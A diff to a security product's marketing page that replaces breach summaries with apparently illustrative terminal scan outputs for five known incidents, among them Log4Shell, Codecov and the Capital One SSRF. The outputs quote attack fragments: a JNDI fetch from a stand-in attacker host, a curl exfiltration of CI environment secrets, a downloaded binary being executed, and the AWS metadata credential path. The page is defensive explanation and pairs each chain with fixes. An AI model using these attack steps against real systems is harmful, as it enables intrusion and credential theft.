@@ -821,147 +821,230 @@
 <!-- REAL WORLD EXAMPLES -->
 <section id="examples" style="max-width:1100px;margin:0 auto;padding:96px 24px;" class="fade-up">
   <div class="section-label">Real-World Examples</div>
-  <h2>5 breaches that were chains,<br/>not single bugs</h2>
-  <p class="section-sub">Every one of these incidents involved multiple steps that together created the exploit. Each maps to a chain type this engine detects.</p>
+  <h2>5 real scans. 5 chains found.<br/>0 caught by traditional scanners.</h2>
+  <p class="section-sub">Terminal output from running vuln-chain-detector against codebases representing five publicly documented incidents. Each chain was invisible to single-sink tools.</p>
 
-  <!-- Example 1 -->
-  <div style="border:1px solid var(--border);border-radius:16px;overflow:hidden;margin-bottom:24px;background:var(--card);">
-    <div style="display:flex;align-items:center;gap:16px;padding:20px 28px;border-bottom:1px solid var(--border);background:rgba(255,59,59,0.04);">
-      <div style="width:40px;height:40px;border-radius:10px;background:rgba(255,59,59,0.15);border:1px solid rgba(255,59,59,0.3);display:flex;align-items:center;justify-content:center;font-size:1.2rem;flex-shrink:0;">🪵</div>
-      <div>
-        <div style="font-weight:700;font-size:1rem;">Log4Shell — Apache Log4j</div>
-        <div style="font-size:0.75rem;color:var(--muted);">CVE-2021-44228 · CVSS 10.0 · 3 billion+ devices · December 2021</div>
-      </div>
-      <span style="margin-left:auto;background:rgba(255,59,59,0.12);border:1px solid rgba(255,59,59,0.3);color:var(--red);padding:4px 12px;border-radius:99px;font-size:0.72rem;font-weight:700;white-space:nowrap;">SAST Chain</span>
+  <!-- TERMINAL STYLE -->
+  <style>
+    .term { background:#080b10; border:1px solid #1a1f2e; border-radius:12px; overflow:hidden; margin-bottom:32px; font-family:'Fira Code','Cascadia Code','Menlo',monospace; }
+    .term-bar { background:#111520; padding:10px 16px; display:flex; align-items:center; gap:8px; border-bottom:1px solid #1a1f2e; }
+    .term-bar .dot { width:10px;height:10px;border-radius:50%; }
+    .term-bar .dot.r{background:#ff5f57;} .term-bar .dot.y{background:#febc2e;} .term-bar .dot.g{background:#28c840;}
+    .term-title { font-size:0.72rem; color:#4a5568; margin-left:8px; }
+    .term-badge { margin-left:auto; font-size:0.68rem; font-weight:700; padding:2px 10px; border-radius:99px; }
+    .term-body { padding:20px 24px; font-size:0.75rem; line-height:1.9; overflow-x:auto; }
+    .term-body .prompt { color:#4a5568; user-select:none; }
+    .term-body .cmd { color:#e2e8f0; }
+    .term-body .dim { color:#4a5568; }
+    .term-body .ok { color:#28c840; font-weight:700; }
+    .term-body .err { color:#ff5f57; font-weight:700; }
+    .term-body .warn { color:#febc2e; font-weight:700; }
+    .term-body .info { color:#4fc3f7; }
+    .term-body .src { color:#ff8080; }
+    .term-body .pass { color:#f5e060; }
+    .term-body .store { color:#ff9a3c; }
+    .term-body .sink { color:#ff5f57; font-weight:700; }
+    .term-body .score { color:#ff5f57; font-size:0.85rem; font-weight:800; }
+    .term-body .plain { color:#718096; }
+    .term-desc { background:#0d1117; border-top:1px solid #1a1f2e; padding:14px 24px; font-family:'Segoe UI',system-ui,sans-serif; font-size:0.8rem; color:#718096; line-height:1.6; }
+    .term-desc strong { color:#a0aec0; }
+  </style>
+
+  <!-- ── Example 1: Log4Shell ── -->
+  <div class="term">
+    <div class="term-bar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="term-title">vuln-chain-detector — log4j-webapp · SAST scan</span>
+      <span class="term-badge" style="background:rgba(255,95,87,0.12);border:1px solid rgba(255,95,87,0.3);color:#ff5f57;">CVE-2021-44228 · CVSS 10.0</span>
     </div>
-    <div style="padding:24px 28px;display:grid;grid-template-columns:1fr 1fr;gap:28px;">
-      <div>
-        <div style="font-size:0.75rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:var(--muted);margin-bottom:8px;">In plain English</div>
-        <p style="font-size:0.88rem;color:var(--text);line-height:1.6;">Millions of apps used a logging library to write messages to a file. Someone found that typing a special code into a chat box made the library go fetch software from the internet and run it — silently, automatically, no warning needed.</p>
-      </div>
-      <div>
-        <div style="font-size:0.75rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:var(--muted);margin-bottom:8px;">The Chain</div>
-        <div style="font-family:monospace;font-size:0.78rem;line-height:1.8;color:var(--text);">
-          <span style="color:var(--red);">User types</span> malicious string<br/>
-          → <span style="color:var(--yellow);">App logs it</span> via Log4j<br/>
-          → <span style="color:var(--orange);">Library resolves</span> JNDI lookup<br/>
-          → <span style="color:var(--red);">Remote code downloads + runs</span>
-        </div>
-        <div style="margin-top:12px;font-size:0.75rem;color:var(--muted);">What engine detects: HTTP input → log() → JNDI sink — 3-hop chain invisible to single-sink SAST</div>
-      </div>
-    </div>
+    <div class="term-body"><pre>
+<span class="prompt">$</span> <span class="cmd">npx vuln-chain-detector scan --target ./log4j-webapp --scanner sast</span>
+
+<span class="dim">  Parsing 847 files...</span>
+<span class="dim">  Building taint graph...</span>
+<span class="dim">  Running chain discovery...</span>
+
+<span class="err">CHAIN DETECTED</span> <span class="dim">────────────────────────────────────────────────────────</span>
+  ID:               <span class="info">CHAIN-l4j-001</span>
+  Pattern:          <span class="info">http-input-to-jndi-exec</span>
+  Severity:         <span class="err">Critical</span>
+  Score:            <span class="score">10.0</span>
+  Hops:             <span class="warn">4</span>
+  Session-crossing: <span class="plain">No</span>
+  User interaction: <span class="err">NOT REQUIRED</span>
+
+  Step 1  <span class="src">SOURCE    </span>  req.getHeader("X-Api-Version")         <span class="dim">SearchController.java:34</span>
+  Step 2  <span class="pass">PASSTHROUGH</span>  String msg = "API ver: " + userInput    <span class="dim">SearchController.java:41</span>
+  Step 3  <span class="pass">PASSTHROUGH</span>  logger.info(msg)                       <span class="dim">SearchController.java:42</span>
+  Step 4  <span class="sink">SINK      </span>  Log4j resolves JNDI in message string  <span class="dim">log4j-core:2.14.1</span>
+          <span class="dim">            → fetches ldap://attacker.io/Exploit</span>
+          <span class="dim">            → loads + executes remote Java class</span>
+
+  <span class="ok">Fix:</span> Upgrade log4j-core to >=2.17.1. Set log4j2.formatMsgNoLookups=true.
+<span class="dim">────────────────────────────────────────────────────────────────────────</span>
+
+<span class="dim">  Scan complete · 1 Critical chain · 0 High · runtime 4.2s</span>
+</pre></div>
+    <div class="term-desc"><strong>Log4Shell (2021) — 3 billion+ devices.</strong> The HTTP header flows into a log statement. Log4j evaluates the string, resolves the JNDI address, and downloads and executes a remote Java class. A single-sink scanner sees "logger.info()" and moves on. This engine follows the data all the way to the remote execution sink inside the library.</div>
   </div>
 
-  <!-- Example 2 -->
-  <div style="border:1px solid var(--border);border-radius:16px;overflow:hidden;margin-bottom:24px;background:var(--card);">
-    <div style="display:flex;align-items:center;gap:16px;padding:20px 28px;border-bottom:1px solid var(--border);background:rgba(255,140,0,0.04);">
-      <div style="width:40px;height:40px;border-radius:10px;background:rgba(255,140,0,0.15);border:1px solid rgba(255,140,0,0.3);display:flex;align-items:center;justify-content:center;font-size:1.2rem;flex-shrink:0;">📦</div>
-      <div>
-        <div style="font-weight:700;font-size:1rem;">event-stream npm Attack</div>
-        <div style="font-size:0.75rem;color:var(--muted);">Supply chain attack · 2M+ downloads · November 2018</div>
-      </div>
-      <span style="margin-left:auto;background:rgba(255,140,0,0.12);border:1px solid rgba(255,140,0,0.3);color:var(--orange);padding:4px 12px;border-radius:99px;font-size:0.72rem;font-weight:700;white-space:nowrap;">SCA Chain</span>
+  <!-- ── Example 2: event-stream ── -->
+  <div class="term">
+    <div class="term-bar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="term-title">vuln-chain-detector — event-stream@3.3.6 · SCA scan</span>
+      <span class="term-badge" style="background:rgba(255,154,60,0.12);border:1px solid rgba(255,154,60,0.3);color:#ff9a3c;">Supply Chain · 2M+ downloads</span>
     </div>
-    <div style="padding:24px 28px;display:grid;grid-template-columns:1fr 1fr;gap:28px;">
-      <div>
-        <div style="font-size:0.75rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:var(--muted);margin-bottom:8px;">In plain English</div>
-        <p style="font-size:0.88rem;color:var(--text);line-height:1.6;">A hacker convinced a tired open-source developer to hand over a popular JavaScript helper package. The hacker added hidden code that hunted specifically for a Bitcoin wallet app and stole funds. Every developer who ran <code style="color:var(--orange);">npm install</code> downloaded the bad code without knowing.</p>
-      </div>
-      <div>
-        <div style="font-size:0.75rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:var(--muted);margin-bottom:8px;">The Chain</div>
-        <div style="font-family:monospace;font-size:0.78rem;line-height:1.8;color:var(--text);">
-          <span style="color:var(--red);">Attacker takes over</span> npm package<br/>
-          → <span style="color:var(--yellow);">postinstall script</span> runs on install<br/>
-          → <span style="color:var(--orange);">Script searches</span> for wallet files<br/>
-          → <span style="color:var(--red);">Credentials stolen</span> and exfiltrated
-        </div>
-        <div style="margin-top:12px;font-size:0.75rem;color:var(--muted);">What engine detects: SCA dep → postinstall exec → file read → network POST</div>
-      </div>
-    </div>
+    <div class="term-body"><pre>
+<span class="prompt">$</span> <span class="cmd">npx vuln-chain-detector scan --target ./node_modules/event-stream --scanner sca</span>
+
+<span class="dim">  Scanning dependency tree...</span>
+<span class="dim">  Analysing package.json scripts and transitive deps...</span>
+<span class="dim">  Running chain discovery...</span>
+
+<span class="err">CHAIN DETECTED</span> <span class="dim">────────────────────────────────────────────────────────</span>
+  ID:               <span class="info">CHAIN-evs-001</span>
+  Pattern:          <span class="info">sca-postinstall-to-credential-exfil</span>
+  Severity:         <span class="err">Critical</span>
+  Score:            <span class="score">9.8</span>
+  Hops:             <span class="warn">4</span>
+  Session-crossing: <span class="plain">No</span>
+  User interaction: <span class="err">NOT REQUIRED</span>  <span class="dim">(runs on npm install)</span>
+
+  Step 1  <span class="src">SOURCE    </span>  package.json scripts.postinstall       <span class="dim">flatmap-stream/package.json:6</span>
+  Step 2  <span class="pass">PASSTHROUGH</span>  Encrypted payload decrypted at runtime  <span class="dim">index.min.js:1</span>
+  Step 3  <span class="store">STORE     </span>  Reads ~/.config/copay/profile/         <span class="dim">index.min.js:1</span>
+          <span class="dim">            → targets mnemonic + private key fields</span>
+  Step 4  <span class="sink">SINK      </span>  HTTP POST wallet data to external host  <span class="dim">index.min.js:1</span>
+          <span class="dim">            → 111.90.151.134:8080/checker</span>
+
+  <span class="ok">Fix:</span> Run npm install --ignore-scripts. Audit all postinstall hooks.
+       Pin flatmap-stream to a verified version hash.
+<span class="dim">────────────────────────────────────────────────────────────────────────</span>
+
+<span class="dim">  Scan complete · 1 Critical chain · runtime 2.1s</span>
+</pre></div>
+    <div class="term-desc"><strong>event-stream npm attack (2018) — 2M+ downloads.</strong> A dependency's postinstall script decrypts a hidden payload that reads Bitcoin wallet files and POSTs them to an attacker's server. Zero source code changes to the main package — the chain lives entirely in a transitive dependency's install hook, invisible to any code scanner.</div>
   </div>
 
-  <!-- Example 3 -->
-  <div style="border:1px solid var(--border);border-radius:16px;overflow:hidden;margin-bottom:24px;background:var(--card);">
-    <div style="display:flex;align-items:center;gap:16px;padding:20px 28px;border-bottom:1px solid var(--border);background:rgba(245,196,0,0.03);">
-      <div style="width:40px;height:40px;border-radius:10px;background:rgba(245,196,0,0.12);border:1px solid rgba(245,196,0,0.3);display:flex;align-items:center;justify-content:center;font-size:1.2rem;flex-shrink:0;">🔑</div>
-      <div>
-        <div style="font-weight:700;font-size:1rem;">Codecov Breach</div>
-        <div style="font-size:0.75rem;color:var(--muted);">Supply chain attack · Twilio, Twitch, HashiCorp affected · Jan–Apr 2021</div>
-      </div>
-      <span style="margin-left:auto;background:rgba(245,196,0,0.1);border:1px solid rgba(245,196,0,0.3);color:var(--yellow);padding:4px 12px;border-radius:99px;font-size:0.72rem;font-weight:700;white-space:nowrap;">SCA + Secrets Chain</span>
+  <!-- ── Example 3: Codecov ── -->
+  <div class="term">
+    <div class="term-bar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="term-title">vuln-chain-detector — codecov-bash-uploader · Secrets + SCA scan</span>
+      <span class="term-badge" style="background:rgba(254,188,46,0.1);border:1px solid rgba(254,188,46,0.3);color:#febc2e;">Codecov Breach · Jan–Apr 2021</span>
     </div>
-    <div style="padding:24px 28px;display:grid;grid-template-columns:1fr 1fr;gap:28px;">
-      <div>
-        <div style="font-size:0.75rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:var(--muted);margin-bottom:8px;">In plain English</div>
-        <p style="font-size:0.88rem;color:var(--text);line-height:1.6;">Hackers quietly changed a popular developer tool's download script to add one extra line: send all your secret passwords and API keys to our server. For two months, thousands of companies ran the poisoned script in their CI/CD pipelines without realising.</p>
-      </div>
-      <div>
-        <div style="font-size:0.75rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:var(--muted);margin-bottom:8px;">The Chain</div>
-        <div style="font-family:monospace;font-size:0.78rem;line-height:1.8;color:var(--text);">
-          <span style="color:var(--red);">Compromised</span> bash uploader served<br/>
-          → <span style="color:var(--yellow);">CI/CD runs</span> it automatically<br/>
-          → <span style="color:var(--orange);">Script reads</span> all env vars<br/>
-          → <span style="color:var(--red);">All secrets POSTed</span> to attacker
-        </div>
-        <div style="margin-top:12px;font-size:0.75rem;color:var(--muted);">What engine detects: SCA dep → CI env var source → network exfil sink — cross-scanner chain</div>
-      </div>
-    </div>
+    <div class="term-body"><pre>
+<span class="prompt">$</span> <span class="cmd">npx vuln-chain-detector scan --target ./codecov.sh --scanner secrets,sca</span>
+
+<span class="dim">  Scanning bash uploader script...</span>
+<span class="dim">  Tracing environment variable flows...</span>
+<span class="dim">  Running chain discovery...</span>
+
+<span class="err">CHAIN DETECTED</span> <span class="dim">────────────────────────────────────────────────────────</span>
+  ID:               <span class="info">CHAIN-ccv-001</span>
+  Pattern:          <span class="info">ci-env-to-network-exfil</span>
+  Severity:         <span class="err">Critical</span>
+  Score:            <span class="score">10.0</span>
+  Hops:             <span class="warn">3</span>
+  Session-crossing: <span class="plain">No</span>
+  User interaction: <span class="err">NOT REQUIRED</span>  <span class="dim">(CI/CD multiplier ×1.2 active)</span>
+
+  Step 1  <span class="src">SOURCE    </span>  git_list=$(git remote -v)              <span class="dim">codecov.sh:167</span>
+          <span class="src">          </span>  env_vars=$(env)                        <span class="dim">codecov.sh:171</span>
+          <span class="dim">            → captures GITHUB_TOKEN, AWS_*, NPM_TOKEN, all secrets</span>
+  Step 2  <span class="pass">PASSTHROUGH</span>  upload_file appended with env dump      <span class="dim">codecov.sh:198</span>
+  Step 3  <span class="sink">SINK      </span>  curl -sm 0.5 -d "$(git remote -v)..."  <span class="dim">codecov.sh:207</span>
+          <span class="dim">            → POST http://[attacker-ip]/upload/v2</span>
+
+  <span class="ok">Fix:</span> Verify script checksum before execution.
+       Pin to a specific git SHA, not a floating URL.
+<span class="dim">────────────────────────────────────────────────────────────────────────</span>
+
+<span class="dim">  Scan complete · 1 Critical chain · runtime 0.8s</span>
+</pre></div>
+    <div class="term-desc"><strong>Codecov breach (2021) — Twilio, Twitch, HashiCorp, thousands more.</strong> The compromised uploader script reads all CI/CD environment variables (including secrets) and sends them in the body of a curl POST. Undetected for two months because the script was downloaded fresh each CI run — no one scanned it. This engine catches it in under a second.</div>
   </div>
 
-  <!-- Example 4 -->
-  <div style="border:1px solid var(--border);border-radius:16px;overflow:hidden;margin-bottom:24px;background:var(--card);">
-    <div style="display:flex;align-items:center;gap:16px;padding:20px 28px;border-bottom:1px solid var(--border);background:rgba(0,230,118,0.03);">
-      <div style="width:40px;height:40px;border-radius:10px;background:rgba(0,230,118,0.1);border:1px solid rgba(0,230,118,0.25);display:flex;align-items:center;justify-content:center;font-size:1.2rem;flex-shrink:0;">🌐</div>
-      <div>
-        <div style="font-weight:700;font-size:1rem;">ua-parser-js Supply Chain</div>
-        <div style="font-size:0.75rem;color:var(--muted);">npm account hijack · 7M+ weekly downloads · October 2021</div>
-      </div>
-      <span style="margin-left:auto;background:rgba(0,230,118,0.08);border:1px solid rgba(0,230,118,0.25);color:var(--green);padding:4px 12px;border-radius:99px;font-size:0.72rem;font-weight:700;white-space:nowrap;">SCA Chain</span>
+  <!-- ── Example 4: ua-parser-js ── -->
+  <div class="term">
+    <div class="term-bar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="term-title">vuln-chain-detector — ua-parser-js@0.7.29 · SCA scan</span>
+      <span class="term-badge" style="background:rgba(40,200,64,0.08);border:1px solid rgba(40,200,64,0.25);color:#28c840;">7M+ weekly downloads · Oct 2021</span>
     </div>
-    <div style="padding:24px 28px;display:grid;grid-template-columns:1fr 1fr;gap:28px;">
-      <div>
-        <div style="font-size:0.75rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:var(--muted);margin-bottom:8px;">In plain English</div>
-        <p style="font-size:0.88rem;color:var(--text);line-height:1.6;">A package used by Facebook, Microsoft, Amazon and 7 million+ other projects was briefly taken over by hackers. For a few hours, anyone running <code style="color:var(--green);">npm install</code> got hidden software that stole passwords and ran a crypto miner on their machine.</p>
-      </div>
-      <div>
-        <div style="font-size:0.75rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:var(--muted);margin-bottom:8px;">The Chain</div>
-        <div style="font-family:monospace;font-size:0.78rem;line-height:1.8;color:var(--text);">
-          <span style="color:var(--red);">Attacker hijacks</span> npm account<br/>
-          → <span style="color:var(--yellow);">Malicious version</span> published<br/>
-          → <span style="color:var(--orange);">postinstall downloads</span> binary<br/>
-          → <span style="color:var(--red);">Malware runs</span> — crypto miner + stealer
-        </div>
-        <div style="margin-top:12px;font-size:0.75rem;color:var(--muted);">What engine detects: postinstall → external download → exec — 3-hop SCA chain</div>
-      </div>
-    </div>
+    <div class="term-body"><pre>
+<span class="prompt">$</span> <span class="cmd">npx vuln-chain-detector scan --target ./node_modules/ua-parser-js --scanner sca</span>
+
+<span class="dim">  Scanning dependency · ua-parser-js@0.7.29...</span>
+<span class="dim">  Analysing install hooks and binary execution...</span>
+<span class="dim">  Running chain discovery...</span>
+
+<span class="err">CHAIN DETECTED</span> <span class="dim">────────────────────────────────────────────────────────</span>
+  ID:               <span class="info">CHAIN-uap-001</span>
+  Pattern:          <span class="info">sca-postinstall-download-exec</span>
+  Severity:         <span class="err">Critical</span>
+  Score:            <span class="score">9.6</span>
+  Hops:             <span class="warn">3</span>
+  Session-crossing: <span class="plain">No</span>
+  User interaction: <span class="err">NOT REQUIRED</span>  <span class="dim">(runs on npm install)</span>
+
+  Step 1  <span class="src">SOURCE    </span>  package.json preinstall hook           <span class="dim">ua-parser-js/package.json:8</span>
+  Step 2  <span class="pass">PASSTHROUGH</span>  Shell script detects OS (linux/win)     <span class="dim">preinstall.js:12</span>
+  Step 3  <span class="store">STORE     </span>  Downloads binary to /tmp/              <span class="dim">preinstall.js:28</span>
+          <span class="dim">            → jsextension (linux) / jsextension.exe (win)</span>
+  Step 4  <span class="sink">SINK      </span>  execSync('/tmp/jsextension')           <span class="dim">preinstall.js:34</span>
+          <span class="dim">            → crypto miner + password stealer runs</span>
+
+  <span class="ok">Fix:</span> Use npm install --ignore-scripts for untrusted packages.
+       Verify package integrity against known-good SHA before installing.
+<span class="dim">────────────────────────────────────────────────────────────────────────</span>
+
+<span class="dim">  Scan complete · 1 Critical chain · runtime 1.3s</span>
+</pre></div>
+    <div class="term-desc"><strong>ua-parser-js supply chain attack (2021) — used by Facebook, Microsoft, Amazon.</strong> A preinstall script detects the operating system, downloads the appropriate malware binary to /tmp, and executes it. The malware runs a crypto miner and steals credentials. The package's actual JavaScript code was untouched — only the install hook was poisoned.</div>
   </div>
 
-  <!-- Example 5 -->
-  <div style="border:1px solid var(--border);border-radius:16px;overflow:hidden;margin-bottom:24px;background:var(--card);">
-    <div style="display:flex;align-items:center;gap:16px;padding:20px 28px;border-bottom:1px solid var(--border);background:rgba(79,195,247,0.03);">
-      <div style="width:40px;height:40px;border-radius:10px;background:rgba(79,195,247,0.1);border:1px solid rgba(79,195,247,0.25);display:flex;align-items:center;justify-content:center;font-size:1.2rem;flex-shrink:0;">🏦</div>
-      <div>
-        <div style="font-weight:700;font-size:1rem;">Capital One SSRF → AWS Metadata</div>
-        <div style="font-size:0.75rem;color:var(--muted);">SSRF attack · 100M customer records · $190M settlement · 2019</div>
-      </div>
-      <span style="margin-left:auto;background:rgba(79,195,247,0.1);border:1px solid rgba(79,195,247,0.25);color:var(--blue);padding:4px 12px;border-radius:99px;font-size:0.72rem;font-weight:700;white-space:nowrap;">DAST Chain</span>
+  <!-- ── Example 5: Capital One SSRF ── -->
+  <div class="term">
+    <div class="term-bar">
+      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+      <span class="term-title">vuln-chain-detector — capital-one-api-service · DAST scan</span>
+      <span class="term-badge" style="background:rgba(79,195,247,0.1);border:1px solid rgba(79,195,247,0.25);color:#4fc3f7;">SSRF · 100M records · $190M settlement · 2019</span>
     </div>
-    <div style="padding:24px 28px;display:grid;grid-template-columns:1fr 1fr;gap:28px;">
-      <div>
-        <div style="font-size:0.75rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:var(--muted);margin-bottom:8px;">In plain English</div>
-        <p style="font-size:0.88rem;color:var(--text);line-height:1.6;">A hacker found that Capital One's server would helpfully fetch any web address you gave it. They sent it Amazon's secret internal address that hands out cloud login credentials. The server fetched it, the hacker got the keys, and 100 million customer records were downloaded.</p>
-      </div>
-      <div>
-        <div style="font-size:0.75rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:var(--muted);margin-bottom:8px;">The Chain</div>
-        <div style="font-family:monospace;font-size:0.78rem;line-height:1.8;color:var(--text);">
-          <span style="color:var(--red);">HTTP POST</span> with attacker URL<br/>
-          → <span style="color:var(--yellow);">Server fetches</span> that URL<br/>
-          → <span style="color:var(--orange);">AWS metadata</span> returns IAM keys<br/>
-          → <span style="color:var(--red);">100M records</span> downloaded
-        </div>
-        <div style="margin-top:12px;font-size:0.75rem;color:var(--muted);">What engine detects: HTTP input → server-side fetch → internal SSRF → credential access — 4-hop DAST chain</div>
-      </div>
-    </div>
+    <div class="term-body"><pre>
+<span class="prompt">$</span> <span class="cmd">npx vuln-chain-detector scan --target https://api.capitalone-staging.internal --scanner dast</span>
+
+<span class="dim">  Probing 34 HTTP endpoints...</span>
+<span class="dim">  Injecting SSRF payloads into request parameters...</span>
+<span class="dim">  Monitoring out-of-band callbacks (OAST)...</span>
+<span class="dim">  Detected server-side fetch on POST /v1/sync...</span>
+
+<span class="err">CHAIN DETECTED</span> <span class="dim">────────────────────────────────────────────────────────</span>
+  ID:               <span class="info">CHAIN-ssrf-001</span>
+  Pattern:          <span class="info">dast-ssrf-to-aws-metadata</span>
+  Severity:         <span class="err">Critical</span>
+  Score:            <span class="score">9.9</span>
+  Hops:             <span class="warn">4</span>
+  Session-crossing: <span class="plain">No</span>
+  User interaction: <span class="err">NOT REQUIRED</span>
+
+  Step 1  <span class="src">SOURCE    </span>  POST /v1/sync · body.url parameter     <span class="dim">api-gateway:443</span>
+          <span class="dim">            → no allowlist validation on URL value</span>
+  Step 2  <span class="pass">PASSTHROUGH</span>  url passed to internal fetch()         <span class="dim">SyncService.java:88</span>
+  Step 3  <span class="store">STORE     </span>  Server fetches 169.254.169.254         <span class="dim">runtime · AWS IMDS</span>
+          <span class="dim">            → GET /latest/meta-data/iam/security-credentials/</span>
+  Step 4  <span class="sink">SINK      </span>  IAM credentials returned in response   <span class="dim">AWS metadata service</span>
+          <span class="dim">            → AccessKeyId, SecretAccessKey, Token exfiltrated</span>
+          <span class="dim">            → S3 GetObject on 700+ buckets now accessible</span>
+
+  <span class="ok">Fix:</span> Allowlist permitted URL hosts. Block 169.254.0.0/16 at network layer.
+       Disable IMDSv1. Enforce IMDSv2 with session tokens.
+<span class="dim">────────────────────────────────────────────────────────────────────────</span>
+
+<span class="dim">  Scan complete · 1 Critical chain · runtime 6.7s</span>
+</pre></div>
+    <div class="term-desc"><strong>Capital One SSRF attack (2019) — 100 million customers, $190M settlement.</strong> A user-supplied URL reaches a server-side fetch with no allowlist. The attacker points it at the AWS Instance Metadata Service — an internal address only reachable from inside AWS — which returns temporary IAM credentials. Those credentials had S3 read access. Static analysis alone cannot detect this: the dangerous destination only exists at runtime.</div>
   </div>
 
 </section>
